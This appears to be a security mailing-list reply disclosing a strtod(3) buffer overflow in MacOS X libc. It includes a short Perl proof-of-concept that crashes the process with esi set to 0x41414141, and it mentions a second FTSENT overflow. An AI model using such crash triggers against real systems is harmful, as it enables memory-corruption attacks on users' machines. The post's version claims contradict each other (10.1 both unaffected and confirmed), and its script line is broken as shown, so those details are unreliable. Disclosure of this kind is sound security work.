Subject: Re: MacOS X 10.5/10.6 libc/strtod(3) buffer
	overflow

I have not checked this issue in macos 10.4. In MacOS 10.1 does not
work. But the perl script (in macos 10.5)

Chujwamwmuzg.pl ---
#!/usr/local/bin/perl
printf "% 0.4194310f, 0x0.0x41414141;
Chujwamwmuzg.pl ---

will crash with
esi = 0x41414141
edi = 0x15

Other bugs in libc also work on new versions of macos. Example overflow
in FTSENT structure

We confirmed this issue in MacOS 10.1.
